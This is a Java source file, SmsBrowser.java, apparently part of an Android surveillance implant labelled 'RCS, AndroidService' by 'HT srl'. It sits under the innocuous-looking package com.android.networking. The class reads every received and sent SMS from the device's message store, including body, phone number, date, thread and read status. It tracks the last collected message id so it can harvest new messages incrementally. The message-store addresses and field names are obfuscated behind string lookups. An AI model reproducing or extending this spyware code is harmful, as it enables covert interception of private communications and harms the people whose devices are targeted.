/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.message;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Sms> list;

	private int id;
	int maxId = 0;

	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}

	public synchronized ArrayList<Sms> getSmsList(int lastManagedId) {
		list.clear();

		int maxRec = parse(Messages.getString("14.0"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
		int maxSent = parse(Messages.getString("14.1"), Sms.SENT, lastManagedId); //$NON-NLS-1$

		maxId = Math.max(maxRec, maxSent);

		return list;
	}

	public synchronized ArrayList<Sms> getLastSmsSent(int lastManagedId) {
		list.clear();

		maxId = parse(Messages.getString("14.1"), Sms.SENT, lastManagedId); //$NON-NLS-1$

		return list;
	}

	private int parse(String content, boolean sentState, int lastManagedId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (parse), lastManagedId: " + lastManagedId);
		}
		final String[] projection = new String[] { "*" };
		final Cursor c = Status.getAppContext().getContentResolver()
				.query(Uri.parse(content), projection, null, null, null);

		final int smsEntriesCount = c.getCount();
		int localMaxId = lastManagedId;

		if (c.moveToFirst() == false) {
			c.close();
			return localMaxId;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body, number;
			long date;
			boolean sentStatus;

			// These fields are needed
			try {
				id = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("_id")).toString());

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): id = " + id + " new maxId: " + maxId);
				}
				if (id <= lastManagedId) {
					continue;
				}

				localMaxId = Math.max(localMaxId, id);
				printColumnsSms(c);

				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.2"))).toString(); //$NON-NLS-1$
				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.3"))).toString(); //$NON-NLS-1$
				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("14.4"))).toString()); //$NON-NLS-1$

				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				c.close();
				return localMaxId;
			}

			final Sms s = new Sms(number, body, date, sentStatus);
			s.setId(id);

			// These fields are optional
			try {
				final String thread_id = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.6"))); //$NON-NLS-1$
				s.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String protocol = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.8"))); //$NON-NLS-1$
				s.setProtocol(protocol);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String read = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.9"))); //$NON-NLS-1$
				s.setRead(read);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String status = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.10"))); //$NON-NLS-1$
				s.setStatus(status);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String type = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.11"))); //$NON-NLS-1$
				s.setType(type);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			try {
				final String reply_path = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.12"))); //$NON-NLS-1$
				s.setReplyPath(reply_path);
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
				}
			}

			c.moveToNext();
			list.add(s);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) end, localMaxId: " + localMaxId);
			}

		}
		if (Cfg.DEBUG) {
			Check.asserts(localMaxId >= lastManagedId, " (parse) Assert failed");
		}
		return localMaxId;
	}

	private void printColumnsSms(Cursor c) {

		for (int j = 0; j < c.getColumnCount(); j++) {
			final String name = c.getColumnName(j);
			final String value = c.getString(c.getColumnIndex(name));
			if (Cfg.DEBUG) {

				if (name.equals("body") || name.equals("body")) {
					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
				}
			}
		}

	}

	public int getMaxId() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getMaxId): " + maxId);
		}
		return maxId;
	}
}